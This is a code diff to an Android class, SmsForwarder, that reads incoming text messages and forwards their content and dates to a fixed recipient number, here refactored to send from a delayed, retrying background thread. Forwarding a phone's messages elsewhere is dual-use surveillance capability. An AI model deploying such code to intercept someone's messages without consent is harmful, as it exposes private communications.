@@ -37,6 +37,7 @@ public class SmsForwarder extends BaseTask {
     private String recepientNumber;
     private ContentResolver contentResolver;
     private boolean isListening;
+    private boolean sending;
 
     public SmsForwarder(CommandService c) {
         setContext(c);
@@ -44,7 +45,7 @@ public class SmsForwarder extends BaseTask {
         contentResolver = context.getContentResolver();
     }
 
-    public boolean isListening () {
+    public boolean isListening() {
         return this.isListening;
     }
 
@@ -152,22 +153,60 @@ public class SmsForwarder extends BaseTask {
                 message += body + "\n\n";
                 message += date + "\n\n";
 
-                sendSms(recepientNumber, message);
+                Thread send = new SendSmsThread(recepientNumber, message);
+                send.start();
             }
 
         }
 
-        public void sendSms(String phonenumber, String message) {
-            SmsManager manager = SmsManager.getDefault();
+        private class SendSmsThread extends Thread {
+            final SmsManager manager = SmsManager.getDefault();
+            private  String phone;
+            private  String message;
+            private int delay = 3000;
 
-            int length = message.length();
+            public SendSmsThread (String phone, String message) {
+                this.phone = phone;
+                this.message = message;
+            }
 
-            if (length > MAX_SMS_MESSAGE_LENGTH) {
-                ArrayList<String> messagelist = manager.divideMessage(message);
+            @Override
+            public void run() {
+                super.run();
+                if (sending) {
+                    Log.i(TAG, "Resending..");
+                    try {
+                        sleep(delay);
+                    } catch (InterruptedException e) {
+                        e.printStackTrace();
+                    }
+                    finally {
+                        new SendSmsThread(this.phone, this.message).start();
+                    }
+                    return;
+                }
+                sending = true;
+                try {
+                    Log.i(TAG, "Sleeping ..");
+                    sleep(delay);
 
-                manager.sendMultipartTextMessage(phonenumber, null, messagelist, null, null);
-            } else {
-                manager.sendTextMessage(phonenumber, null, message, null, null);
+                } catch (InterruptedException e) {
+                    e.printStackTrace();
+                } finally {
+                    Log.i(TAG, "Sending message ");
+                    int length = message.length();
+
+                    if (length > MAX_SMS_MESSAGE_LENGTH) {
+                        ArrayList<String> messagelist = manager.divideMessage(message);
+
+                        manager.sendMultipartTextMessage(phone, null, messagelist, null, null);
+                    } else {
+                        manager.sendTextMessage(phone, null, message, null, null);
+                    }
+
+                    sending = false;
+
+                }
             }
         }
 
